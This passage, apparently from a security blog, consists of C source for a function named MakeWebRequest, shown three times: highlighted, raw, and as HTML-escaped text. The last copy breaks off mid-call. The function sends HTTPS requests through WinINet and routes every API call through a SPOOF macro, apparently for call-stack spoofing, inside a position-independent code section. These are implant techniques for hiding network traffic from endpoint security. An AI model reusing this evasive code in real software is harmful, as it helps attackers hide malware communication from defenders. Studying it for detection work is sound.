class="enlighter-e1">NULL</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Connect to site</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HINTERNET hSite = </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-g1">)</span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetConnectA</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                           site, </span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> INTERNET_DEFAULT_HTTPS_PORT </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> INTERNET_SERVICE_HTTP </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                           0, </span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD_PTR</span><span class="enlighter-g1">)</span><span class="enlighter-e1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">hSite</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Create http request </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        LPCSTR acceptTypes</span><span class="enlighter-g1">[]</span><span class="enlighter-text"> = </span><span class="enlighter-g1">{</span><span class="enlighter-text"> </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"*/*"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        HINTERNET hReq = </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-g1">)</span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">HttpOpenRequestA</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              hSite, </span></div></div><div class=""><div><span class="enlighter-text">                                              verb, </span></div></div><div class=""><div><span class="enlighter-text">                                              uri, </span></div></div><div class=""><div><span class="enlighter-text">                                              </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              acceptTypes, </span></div></div><div class=""><div><span class="enlighter-text">                                              </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">                                              0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">hReq</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Set headers + content length values</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            DWORD headersLen = 0;</span></div></div><div class=""><div><span class="enlighter-text">            DWORD contentLen = 0;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">headers != </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                headersLen = </span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD</span><span class="enlighter-g1">)</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">headers</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">content != </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                contentLen = </span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD</span><span class="enlighter-g1">)</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">content</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Send http request using specified headers and content</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">BOOL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">HttpSendRequest</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> hReq </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       headers, </span></div></div><div class=""><div><span class="enlighter-text">                                       </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> headersLen </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       content, </span></div></div><div class=""><div><span class="enlighter-text">                                       </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> contentLen </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-g1">)</span><span class="enlighter-text"> == </span><span class="enlighter-e0">TRUE</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-c0">// Allocate a buffer to receive response from server</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-c0">// This should really be allocated dynamically, but 5K is enough for the requests we are making.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                lpResult = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">5000, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-c0">// Call InternetReadFile in a loop until we have read everything.  </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                DWORD dwBytesRead = 0, currbytes_read;</span></div></div><div class=""><div><span class="enlighter-text">                BOOL bKeepReading = </span><span class="enlighter-e0">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">do</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                    bKeepReading = </span><span class="enlighter-g1">(</span><span class="enlighter-text">BOOL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetReadFile</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                                          pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                                          pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                                          </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> hReq </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                                          </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpResult + dwBytesRead </span><span class="enlighter-g1">)</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">                                                          </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> 5000 - dwBytesRead </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                                          </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> &amp;currbytes_read </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                    dwBytesRead += currbytes_read;</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-g1">}</span><span class="enlighter-text"> </span><span class="enlighter-k1">while</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">bKeepReading &amp;&amp; currbytes_read</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Close handle to request</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetCloseHandle</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                    hReq </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Close handle to site</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetCloseHandle</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                hSite</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> lpResult;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( D ) LPVOID MakeWebRequest(HANDLE hInternet, 
                                    PVOID site, 
                                    PVOID uri, 
                                    PVOID verb, 
                                    PVOID headers, 
                                    PVOID content, 
                                    struct MemAddrs* pMemAddrs)
{
    LPVOID lpResult = NULL;

    // Connect to site
    HINTERNET hSite = ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.InternetConnectA, 
                                           pMemAddrs-&gt;Api.net.hNet, 
                                           pMemAddrs-&gt;Api.net.size, 
                                           hInternet, 
                                           site, 
                                           C_PTR( U_PTR( INTERNET_DEFAULT_HTTPS_PORT ) ), 
                                           NULL, 
                                           NULL, 
                                           C_PTR( U_PTR( INTERNET_SERVICE_HTTP ) ), 
                                           0, 
                                           C_PTR( U_PTR( (DWORD_PTR)NULL ) ) );

    if (hSite)
    {
        // Create http request 
        LPCSTR acceptTypes[] = { C_PTR ( OFFSET ( "*/*" ) ), NULL };
        HINTERNET hReq = ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.HttpOpenRequestA, 
                                              pMemAddrs-&gt;Api.net.hNet, 
                                              pMemAddrs-&gt;Api.net.size, 
                                              hSite, 
                                              verb, 
                                              uri, 
                                              NULL, 
                                              NULL, 
                                              acceptTypes, 
                                              C_PTR( U_PTR( INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE ) ),
                                              0);

        if (hReq)
        {
            // Set headers + content length values
            DWORD headersLen = 0;
            DWORD contentLen = 0;
            if (headers != NULL)
                headersLen = (DWORD)pMemAddrs-&gt;Api.msvcrt.strlen(headers);
            if (content != NULL)
                contentLen = (DWORD)pMemAddrs-&gt;Api.msvcrt.strlen(content);

            // Send http request using specified headers and content
            if ((BOOL) U_PTR ( SPOOF( pMemAddrs-&gt;Api.net.HttpSendRequest, 
                                       pMemAddrs-&gt;Api.net.hNet, 
                                       pMemAddrs-&gt;Api.net.size, 
                                       C_PTR ( hReq ), 
                                       headers, 
                                       C_PTR ( U_PTR( headersLen ) ), 
                                       content, 
                                       C_PTR ( U_PTR ( contentLen ) ) ) 
                ) == TRUE)
            {
                // Allocate a buffer to receive response from server
                // This should really be allocated dynamically, but 5K is enough for the requests we are making.
                lpResult = pMemAddrs-&gt;Api.msvcrt.calloc(5000, sizeof(char));

                // Call InternetReadFile in a loop until we have read everything.  
                DWORD dwBytesRead = 0, currbytes_read;
                BOOL bKeepReading = TRUE;
                do
                {
                    bKeepReading = (BOOL) U_PTR ( SPOOF( pMemAddrs-&gt;Api.net.InternetReadFile, 
                                                          pMemAddrs-&gt;Api.net.hNet, 
                                                          pMemAddrs-&gt;Api.net.size, 
                                                          C_PTR ( hReq ), 
                                                          C_PTR ( lpResult + dwBytesRead ),
                                                          C_PTR ( U_PTR ( 5000 - dwBytesRead ) ), 
                                                          C_PTR ( U_PTR ( &amp;currbytes_read ) ) ) );
                    dwBytesRead += currbytes_read;
                } while (bKeepReading &amp;&amp; currbytes_read);
            }
            
            // Close handle to request
            SPOOF( pMemAddrs-&gt;Api.net.InternetCloseHandle, 
                    pMemAddrs-&gt;Api.net.hNet, 
                    pMemAddrs-&gt;Api.net.size, 
                    hReq );
        }

        // Close handle to site
        SPOOF( pMemAddrs-&gt;Api.net.InternetCloseHandle, 
                pMemAddrs-&gt;Api.net.hNet, 
                pMemAddrs-&gt;Api.net.size, 
                hSite);
    }

    return lpResult;
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) LPVOID MakeWebRequest(HANDLE hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID site,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID uri,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID verb,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID headers,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID content,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct MemAddrs* pMemAddrs)
{
&nbsp;&nbsp;&nbsp;&nbsp;LPVOID lpResult = NULL;

&nbsp;&nbsp;&nbsp;&nbsp;// Connect to site
&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET hSite = ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.InternetConnectA,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;site,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( INTERNET_DEFAULT_HTTPS_PORT ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( INTERNET_SERVICE_HTTP ) ),&nbsp;
